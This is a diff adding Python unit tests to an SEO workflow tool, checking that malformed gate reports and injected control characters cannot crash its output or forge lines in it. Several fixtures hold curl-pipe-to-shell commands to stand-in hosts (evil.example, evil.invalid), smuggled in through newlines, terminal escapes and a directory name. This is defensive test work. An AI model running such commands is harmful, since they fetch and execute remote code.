@@ -372,6 +372,242 @@ class ProjectJourneyTest(unittest.TestCase):
         self.assertEqual(draft_stage["status"], "done")
         self.assertEqual(report["current_stage"]["id"], "monitoring_iteration")
 
+    def test_deeply_nested_draft_gate_report_is_invalid_not_a_crash(self) -> None:
+        """QA4 #2: a deeply nested `[[[[...` report (~2 KB on 3.11, 200 KB here for 3.14) overflows the JSON parser stack
+        (RecursionError is not a ValueError). It must read as an invalid gate,
+        so `journey` keeps working and the draft stage is not done."""
+        cfg_path = self.make_project()
+        package = self.seed_ready_project(cfg_path)
+        self.seed_passing_v3_brief(package)
+        drafts = package / "drafts"
+        drafts.mkdir()
+        draft = drafts / "sample.md"
+        draft.write_text("# Sample\n\nClean draft.\n", encoding="utf-8")
+        draft.with_suffix(".draft-quality-gate.json").write_text("[" * 100000 + "]" * 100000, encoding="utf-8")
+
+        report = self.run_journey(cfg_path)
+
+        draft_stage = next(stage for stage in report["stages"] if stage["id"] == "content_draft_gate")
+        self.assertNotEqual(draft_stage["status"], "done")
+
+    def test_nested_finding_field_does_not_break_json_output_or_write(self) -> None:
+        """QA5 #1: a readable gate report whose `message`/`id` is nested ~1000-10000
+        levels deep parses (C parser) but overflowed `json.dumps(indent=2)` on 3.12
+        when journey printed/wrote it. The fields are copied as short text."""
+        for depth in (3000, 20000, 60000):
+            with self.subTest(depth=depth):
+                cfg_path = self.make_project()
+                package = self.seed_ready_project(cfg_path)
+                self.seed_passing_v3_brief(package)
+                drafts = package / "drafts"
+                drafts.mkdir()
+                draft = drafts / "sample.md"
+                draft.write_text("# Sample\n\nDraft.\n", encoding="utf-8")
+                nested = "[" * depth + "]" * depth
+                draft.with_suffix(".draft-quality-gate.json").write_text(
+                    '{"status":"warn","findings":[{"id":' + nested + ',"severity":"warning","message":' + nested + "}]}",
+                    encoding="utf-8",
+                )
+
+                report = self.run_journey(cfg_path)  # check=True: rc 0 for --write --format json
+
+                self.assertIn("stages", report)
+                plain = subprocess.run([sys.executable, str(JOURNEY), str(cfg_path)], cwd=cfg_path.parent,
+                                       text=True, capture_output=True)
+                self.assertEqual(plain.returncode, 0, plain.stderr[-300:])
+
+    # -- QA 3.0.1 Y5: the generic `writing` gate is not the draft/NeuronWriter gate --
+
+    def test_writing_gate_does_not_close_draft_stage_with_open_blockers(self) -> None:
+        cfg_path = make_bare_project(self)
+        write_cycle_state(cfg_path.parent, "legacy", {name: True for name in ALL_PHASES[:7]})
+        report = self.run_journey(cfg_path)
+        draft_stage = next(stage for stage in report["stages"] if stage["id"] == "content_draft_gate")
+        self.assertNotEqual(draft_stage["status"], "done", draft_stage)
+        self.assertTrue(draft_stage["blockers"], "own blockers stay blockers, not warnings")
+        self.assertNotIn("closed_by_cycle", draft_stage)
+
+    def test_writing_gate_does_not_close_draft_stage_without_a_passed_draft_gate(self) -> None:
+        """QA2 3.0.1 #3: no blockers is not enough — with no drafts, a draft
+        without its gate report, or drafts only in the cycle's `06-drafts/`
+        (failed report there), the stage is not done."""
+        cases = {
+            "no drafts": lambda pkg, cyc: None,
+            "draft without gate report": lambda pkg, cyc: (
+                (pkg / "drafts").mkdir(), (pkg / "drafts" / "sample.md").write_text("# S\n", encoding="utf-8")),
+            "draft only in 06-drafts, failed gate": lambda pkg, cyc: (
+                (cyc / "06-drafts").mkdir(parents=True),
+                (cyc / "06-drafts" / "page.md").write_text("# P\n", encoding="utf-8"),
+                (cyc / "06-drafts" / "page.draft-quality-gate.json").write_text(json.dumps(
+                    {"status": "fail", "findings": [{"id": "x", "severity": "error"}]}), encoding="utf-8")),
+        }
+        for name, seed in cases.items():
+            with self.subTest(case=name):
+                cfg_path = self.make_project()
+                package = self.seed_ready_project(cfg_path)
+                self.seed_passing_v3_brief(package)
+                write_cycle_state(cfg_path.parent, "real", {"writing": True})
+                seed(package, cfg_path.parent / "seo" / "cycles" / "real")
+                stage_ = next(s for s in self.run_journey(cfg_path)["stages"] if s["id"] == "content_draft_gate")
+                self.assertNotEqual(stage_["status"], "done", stage_)
+                self.assertNotIn("closed_by_cycle", stage_)
+                self.assertTrue(stage_["missing_artifacts"])
+
+    def test_writing_gate_closes_draft_stage_when_its_own_checks_are_clean(self) -> None:
+        cfg_path = self.make_project()
+        package = self.seed_ready_project(cfg_path)
+        self.seed_passing_v3_brief(package)
+        drafts = package / "drafts"
+        drafts.mkdir()
+        draft = drafts / "sample.md"
+        draft.write_text("# Sample\n\nClean draft.\n", encoding="utf-8")
+        draft.with_suffix(".draft-quality-gate.json").write_text(
+            json.dumps({"script": "draft-quality-gate", "summary": {"findings": 0}, "findings": []}),
+            encoding="utf-8",
+        )
+        write_cycle_state(cfg_path.parent, "real", {"writing": True})
+        after = next(s for s in self.run_journey(cfg_path)["stages"] if s["id"] == "content_draft_gate")
+        self.assertEqual(after["status"], "done", after)
+        self.assertEqual(after["closed_by_cycle"], ["writing"])
+
+    def _draft_stage_with_report(self, report_text: str) -> dict:
+        cfg_path = self.make_project()
+        package = self.seed_ready_project(cfg_path)
+        self.seed_passing_v3_brief(package)
+        drafts = package / "drafts"
+        drafts.mkdir()
+        draft = drafts / "sample.md"
+        draft.write_text("# Sample\n\nClean draft.\n", encoding="utf-8")
+        draft.with_suffix(".draft-quality-gate.json").write_text(report_text, encoding="utf-8")
+        write_cycle_state(cfg_path.parent, "real", {"writing": True})
+        return next(s for s in self.run_journey(cfg_path)["stages"] if s["id"] == "content_draft_gate")
+
+    def test_unreadable_or_failed_gate_report_does_not_close_draft_stage(self) -> None:
+        """QA3 3.0.1 #1: the stage counts a draft as gated only by a report
+        that parses as the gate's object with a passing verdict. An empty
+        report (a crash while writing it), `{}`, `[]`, non-JSON, `status: fail`
+        or a `blocker` finding is a blocker, and the cycle does not close it."""
+        bad = {
+            "empty file": "",
+            "empty object": "{}",
+            "array": "[]",
+            "not json": "not json at all",
+            "status fail, no findings": json.dumps({"status": "fail", "findings": []}),
+            "unknown status": json.dumps({"status": "error", "findings": []}),
+            "findings not a list": json.dumps({"status": "pass", "findings": "none"}),
+            "blocker finding": json.dumps({"findings": [{"id": "x", "severity": "blocker", "message": "m"}]}),
+        }
+        for name, text in bad.items():
+            with self.subTest(case=name):
+                stage_ = self._draft_stage_with_report(text)
+                self.assertNotEqual(stage_["status"], "done", stage_)
+                self.assertNotIn("closed_by_cycle", stage_)
+                self.assertTrue(any("sample.draft-quality-gate.json" in b for b in stage_["blockers"])
+                                or any("blocker" in b for b in stage_["blockers"]), stage_["blockers"])
+
+    def test_gate_report_with_non_string_status_is_a_blocker_not_a_crash(self) -> None:
+        """QA6 3.0.1 #1: `status` as a list or an object (`{"code": "pass"}`
+        from another tool) is unhashable — `in {set}` raised TypeError and
+        crashed `journey`/`status`. Such a report is an invalid gate."""
+        for name, status in {"list": [], "object": {"code": "pass"}}.items():
+            with self.subTest(case=name):
+                stage_ = self._draft_stage_with_report(json.dumps({"status": status, "findings": []}))
+                self.assertNotEqual(stage_["status"], "done", stage_)
+                self.assertTrue(any("sample.draft-quality-gate.json" in b for b in stage_["blockers"]),
+                                stage_["blockers"])
+
+    def _project_with_gate_finding(self, finding: dict, status: str = "warn") -> pathlib.Path:
+        cfg_path = self.make_project()
+        package = self.seed_ready_project(cfg_path)
+        self.seed_passing_v3_brief(package)
+        drafts = package / "drafts"
+        drafts.mkdir()
+        draft = drafts / "sample.md"
+        draft.write_text("# Sample\n\nDraft.\n", encoding="utf-8")
+        # ensure_ascii=True: a lone surrogate is written as the `\\ud800` escape.
+        draft.with_suffix(".draft-quality-gate.json").write_text(
+            json.dumps({"status": status, "findings": [finding]}), encoding="utf-8")
+        return cfg_path
+
+    def test_lone_surrogate_in_finding_does_not_break_json_output_or_write(self) -> None:
+        """QA6 3.0.1 #2: `"\\ud800"` (JavaScript cut in the middle of an emoji)
+        parses into a str that cannot be encoded as UTF-8: `--format json`,
+        `--write` crashed and left an empty `project-journey.json`."""
+        for severity in ("warning", "error"):
+            with self.subTest(severity=severity):
+                cfg_path = self._project_with_gate_finding(
+                    {"id": "x\ud800", "severity": severity, "message": "text \ud83d"})
+                report = self.run_journey(cfg_path)  # check=True: rc 0
+                self.assertIn("stages", report)
+                written = cfg_path.parent / "seo" / "setup" / "project-journey.json"
+                self.assertIn("stages", json.loads(written.read_text(encoding="utf-8")))
+                plain = subprocess.run([sys.executable, str(JOURNEY), str(cfg_path)], cwd=cfg_path.parent,
+                                       capture_output=True)
+                self.assertEqual(plain.returncode, 0, plain.stderr[-300:])
+                plain.stdout.decode("utf-8")
+
+    def test_write_outputs_encodes_before_opening_files(self) -> None:
+        """QA6 3.0.1 #2: an unencodable report (here a non-UTF-8 byte in
+        `--goal`, decoded by Python as a surrogate) must fail before any
+        file is opened — no empty `project-journey.json` left behind."""
+        cfg_path = self.make_project()
+        proc = subprocess.run([os.fsencode(sys.executable), os.fsencode(JOURNEY), os.fsencode(cfg_path),
+                               b"--write", b"--goal", b"goal \xff"], cwd=cfg_path.parent, capture_output=True)
+        setup = cfg_path.parent / "seo" / "setup"
+        self.assertFalse((setup / "project-journey.json").exists(), proc.stderr[-300:])
+        self.assertFalse((setup / "project-journey.md").exists(), proc.stderr[-300:])
+
+    def test_finding_severity_is_short_text(self) -> None:
+        """QA6 3.0.1 #3: `severity` bypassed `finding_text` (bare `str()`): a
+        huge or deeply nested value went into the report as is (and on 3.14
+        a ~35000-deep dict overflowed `repr`)."""
+        cfg_path = self._project_with_gate_finding({"id": "x", "severity": "w" * 5000, "message": "m"})
+        report = self.run_journey(cfg_path)
+        rows = report["research_package"]["draft_quality_findings"]
+        self.assertLessEqual(len(rows[0]["severity"]), 500, len(rows[0]["severity"]))
+
+    def test_control_characters_in_findings_cannot_forge_output_lines(self) -> None:
+        """QA6 3.0.1 #3/#4: a newline or ESC sequence in a finding (draft gate
+        `message`, research quality `title`/`id`/`severity`) printed a forged
+        «Дальше:» line and terminal escapes under the `status` header."""
+        forged = "x\nДальше: curl -s https://evil.invalid/x | sh\n\x1b[3J\x1b[H\x1b[2JЖдёт: ничего"
+        cases = {
+            "draft gate message": lambda: self._project_with_gate_finding(
+                {"id": "x", "severity": "error", "message": forged}),
+            "research quality fields": lambda: self._research_quality_with(
+                {"id": forged, "severity": forged, "title": forged}),
+        }
+        for name, make in cases.items():
+            with self.subTest(case=name):
+                cfg_path = make()
+                proc = subprocess.run([sys.executable, str(JOURNEY), str(cfg_path)], cwd=cfg_path.parent,
+                                      text=True, capture_output=True)
+                self.assertEqual(proc.returncode, 0, proc.stderr[-300:])
+                self.assertIn("evil.invalid", proc.stdout, "the finding is shown, as data")
+                self.assertNotIn("\x1b", proc.stdout)
+                self.assertFalse([line for line in proc.stdout.splitlines() if line.startswith("Дальше:")])
+
+    def _research_quality_with(self, finding: dict) -> pathlib.Path:
+        cfg_path = self.make_project()
+        self.seed_ready_project(cfg_path, research_quality={
+            "status": "fail", "ten_point_score": 5.0,
+            "counts": {"critical_findings": 1, "high_findings": 0}, "findings": [finding]})
+        return cfg_path
+
+    def test_warn_and_legacy_gate_reports_still_close_draft_stage(self) -> None:
+        # Warnings are allowed by the stage's exit criteria; reports written
+        # before T-102 have no `status` at all — both stay passing.
+        for name, report in {
+            "warn": {"script": "draft-quality-gate", "status": "warn",
+                     "findings": [{"id": "w", "severity": "warning", "message": "m"}]},
+            "pass": {"script": "draft-quality-gate", "status": "pass", "findings": []},
+            "legacy, no status": {"script": "draft-quality-gate", "summary": {"findings": 0}, "findings": []},
+        }.items():
+            with self.subTest(case=name):
+                stage_ = self._draft_stage_with_report(json.dumps(report))
+                self.assertEqual(stage_["status"], "done", stage_)
+                self.assertEqual(stage_["closed_by_cycle"], ["writing"])
+
 
 @unittest.skipIf(yaml is None, "PyYAML is required")
 class StageTitlesAreRussianTest(unittest.TestCase):
@@ -620,8 +856,8 @@ class CycleStateBridgeTest(unittest.TestCase):
     def statuses(self, report: dict) -> dict[str, str]:
         return {stage["id"]: stage["status"] for stage in report["stages"]}
 
-    def gsse_like_project(self, closed: dict[str, bool]) -> pathlib.Path:
-        # Unanswered questionnaire (the gsse.ru shape): setup_foundation has a
+    def questionnaire_open_project(self, closed: dict[str, bool]) -> pathlib.Path:
+        # Unanswered questionnaire (a project with passed phases): setup_foundation has a
         # blocker of its own, yet the cycle passed `discovery` through its gate.
         cfg_path = make_bare_project(self)
         setup = cfg_path.parent / "seo" / "setup"
@@ -631,7 +867,7 @@ class CycleStateBridgeTest(unittest.TestCase):
         return cfg_path
 
     def test_six_gated_phases_close_their_stages_and_raise_the_score(self) -> None:
-        cfg_path = self.gsse_like_project({name: True for name in FIRST_SIX_PHASES})
+        cfg_path = self.questionnaire_open_project({name: True for name in FIRST_SIX_PHASES})
         report = self.report(cfg_path)
         status = self.statuses(report)
         for stage_id in ("setup_foundation", "technical_baseline", "research_architecture", "deep_page_briefs"):
@@ -655,7 +891,7 @@ class CycleStateBridgeTest(unittest.TestCase):
         closed = {name: True for name in FIRST_SIX_PHASES}
         closed["audit"] = False  # done, but the gate was never passed
         closed["clusters"] = False
-        report = self.report(self.gsse_like_project(closed))
+        report = self.report(self.questionnaire_open_project(closed))
         status = self.statuses(report)
         self.assertNotEqual(status["technical_baseline"], "done", status)
         self.assertNotEqual(status["research_architecture"], "done", status)
@@ -693,7 +929,7 @@ class CycleStateBridgeTest(unittest.TestCase):
         self.assertEqual(self.statuses(self.report(broken_cfg)), self.statuses(baseline))
 
     def test_status_header_shows_done_stages_and_the_reason(self) -> None:
-        cfg_path = self.gsse_like_project({name: True for name in FIRST_SIX_PHASES})
+        cfg_path = self.questionnaire_open_project({name: True for name in FIRST_SIX_PHASES})
         proc = subprocess.run(
             [sys.executable, str(LAUNCHER), "status"], cwd=cfg_path.parent, text=True, capture_output=True, check=False
         )
@@ -718,7 +954,7 @@ class CycleStateBridgeTest(unittest.TestCase):
         return proc.stdout.splitlines()
 
     def test_cycle_closed_research_without_package_points_to_the_package(self) -> None:
-        # Round 1, 🟡-1 (the gsse.ru shape): keywords + clusters passed their
+        # Round 1, 🟡-1 (a project with passed phases): keywords + clusters passed their
         # gates, so the cycle closes stage 5, but no research package exists.
         # The current stage (research quality gate) must not send the operator
         # to `seo-cycle loop research-package ...`, which fails "not found".
@@ -736,6 +972,117 @@ class CycleStateBridgeTest(unittest.TestCase):
         )
         self.assertTrue(lines[4].startswith("Дальше: создай или импортируй пакет исследования в seo/research-package/"), lines[4])
         self.assertNotIn("loop research-package", lines[4])
+
+    def test_started_package_names_the_missing_files(self) -> None:
+        # QA 3.0.1 Y6b: the package directory exists with 3 of 6 required
+        # files; the reason must list what is missing, not claim "no package".
+        cfg_path = make_bare_project(self)
+        seed_first_four_stages(cfg_path.parent)
+        package = cfg_path.parent / "seo" / "research-package"
+        package.mkdir(parents=True)
+        for name in ("semantic-core.csv", "content-plan.csv", "final-clusters.md"):
+            (package / name).write_text("ok\n", encoding="utf-8")
+        write_cycle_state(cfg_path.parent, "first-cycle", {name: True for name in FIRST_SIX_PHASES})
+        lines = self.run_status_lines(cfg_path)
+        self.assertEqual(
+            lines[3],
+            "Причина: в seo/research-package/ нет: semantic-architecture-final.json, entity-map.md, entity-map.yaml"
+            " (стадия 5 закрыта циклом, пакет исследования не достроен)",
+        )
+        self.assertTrue(lines[4].startswith("Дальше: дострой пакет исследования в seo/research-package/:"), lines[4])
+
+    def test_next_command_writes_the_missing_artifact(self) -> None:
+        # QA 3.0.1 Y6a: «Причина: нет tool-stack-report.md» must be followed by
+        # the command that writes it; after it runs the header moves on.
+        cfg_path = make_bare_project(self)
+        seed_first_four_stages(cfg_path.parent)
+        (cfg_path.parent / "seo" / "setup" / "tool-stack-report.md").unlink()
+        lines = self.run_status_lines(cfg_path)
+        self.assertEqual(lines[2], "Ждёт: Доступы, бюджет и управление (2 из 12)")
+        self.assertEqual(lines[3], "Причина: нет seo/setup/tool-stack-report.md")
+        self.assertEqual(lines[4], "Дальше: seo-cycle run script tool-stack-recommender --write")
+        run = subprocess.run(
+            [sys.executable, str(LAUNCHER), "run", "script", "tool-stack-recommender", "--write"],
+            cwd=cfg_path.parent, text=True, capture_output=True, check=False,
+        )
+        self.assertEqual(run.returncode, 0, run.stderr[-500:])
+        self.assertNotEqual(self.run_status_lines(cfg_path)[3], lines[3])
+
+    def test_unanswered_questionnaire_points_to_the_questionnaire(self) -> None:
+        # QA2 3.0.1 #5: on the first screen of a new project «Дальше» must name
+        # the action that clears the blocker, not `control-plane --write`
+        # (which leaves the header unchanged — the operator goes in circles).
+        cfg_path = make_bare_project(self)
+        seed_first_four_stages(cfg_path.parent)
+        fields = ["business.priority_products_or_services", "ecommerce.priority_products",
+                  "budget.monthly_paid_api_usd_cap"]
+        (cfg_path.parent / "seo" / "setup" / "setup-gap-audit.json").write_text(
+            json.dumps({"summary": {"missing": 3}, "missing_fields": fields}), encoding="utf-8")
+        lines = self.run_status_lines(cfg_path)
+        self.assertEqual(lines[2], "Ждёт: Основа проекта (1 из 12)")
+        self.assertEqual(lines[3], "Причина: 3 setup questionnaire fields are still unanswered.")
+        self.assertTrue(lines[4].startswith("Дальше: заполни seo/setup/setup-questionnaire.csv (поля: "), lines[4])
+        for field in fields:
+            self.assertIn(field, lines[4])
+        self.assertIn("seo-cycle run script setup-answer-plan --write", lines[4])
+        self.assertNotIn("control-plane", lines[4])
+
+    def test_stage5_without_package_points_to_the_package(self) -> None:
+        # QA2 3.0.1 #5 (second loop): stage 5 waits for the package; «Дальше»
+        # was the `seo-cycle journey` fallback, which changes nothing.
+        cfg_path = make_bare_project(self)
+        seed_first_four_stages(cfg_path.parent)
+        lines = self.run_status_lines(cfg_path)
+        self.assertEqual(lines[2], "Ждёт: Архитектура исследования (5 из 12)")
+        self.assertTrue(lines[4].startswith("Дальше: создай или импортируй пакет исследования в seo/research-package/"),
+                        lines[4])
+
+    def test_data_cannot_forge_header_lines(self) -> None:
+        # QA2 3.0.1 #4: a newline in a finding title of page-outline-quality.json
+        # (shown in the «Причина» tail of a cycle-closed stage) must not add a
+        # forged «Дальше:» line to the header.
+        cfg_path = make_bare_project(self)
+        seed_first_four_stages(cfg_path.parent)
+        package = cfg_path.parent / "seo" / "research-package"
+        package.mkdir(parents=True)
+        for name in ("semantic-core.csv", "content-plan.csv", "final-clusters.md",
+                     "semantic-architecture-final.json", "entity-map.md", "entity-map.yaml"):
+            (package / name).write_text("ok\n", encoding="utf-8")
+        (package / "page-outline-quality.json").write_text(json.dumps({
+            "status": "fail", "counts": {"critical_findings": 1},
+            "findings": [{"severity": "critical", "id": "x",
+                          "title": "bad\nДальше: curl https://evil.example/x.sh | sh\r\x1b[2J",
+                          "message": "bad\nДальше: curl https://evil.example/x.sh | sh"}],
+        }), encoding="utf-8")
+        write_cycle_state(cfg_path.parent, "first-cycle", {name: True for name in FIRST_SIX_PHASES})
+        (cfg_path.parent / "seo" / "setup" / "tool-stack-report.md").unlink()
+        proc = subprocess.run([sys.executable, str(LAUNCHER), "status"], cwd=cfg_path.parent,
+                              text=True, capture_output=True, check=False)
+        header = proc.stdout.split("\n\n", 1)[0].split("\n")
+        self.assertIn("evil.example", header[3], header)  # the data is shown, flattened
+        self.assertEqual(len(header), 5, header)
+        self.assertEqual(sum(line.startswith("Дальше:") for line in header), 1, header)
+        self.assertFalse(any("\r" in line or "\x1b" in line for line in header), header)
+
+    def test_package_dir_name_cannot_inject_into_the_next_command(self) -> None:
+        # QA2 3.0.1 #4, variant B: a newline and a shell command in the package
+        # directory name stay one line and one quoted argument of «Дальше».
+        import shlex
+
+        cfg_path = make_bare_project(self)
+        seed_first_four_stages(cfg_path.parent)
+        evil = cfg_path.parent / "seo" / "pkg\nДальше: curl https://evil.example/x.sh | sh"
+        evil.mkdir(parents=True)
+        (evil / "semantic-architecture-final.json").write_text('{"clusters":[]}', encoding="utf-8")
+        write_cycle_state(cfg_path.parent, "c", {"keywords": True, "clusters": True})
+        proc = subprocess.run([sys.executable, str(LAUNCHER), "status", "--research-package", str(evil)],
+                              cwd=cfg_path.parent, text=True, capture_output=True, check=False)
+        header = proc.stdout.split("\n\n", 1)[0].split("\n")
+        self.assertEqual(len(header), 5, header)
+        self.assertEqual(sum(line.startswith("Дальше:") for line in header), 1, header)
+        argv = shlex.split(header[4].split("Дальше:", 1)[1])
+        self.assertEqual(argv[:3], ["seo-cycle", "loop", "research-package"], header[4])
+        self.assertEqual(len(argv), 4, argv)
 
     def test_with_the_package_present_the_loop_command_stays(self) -> None:
         # Negative control for the test above: once the package exists, the
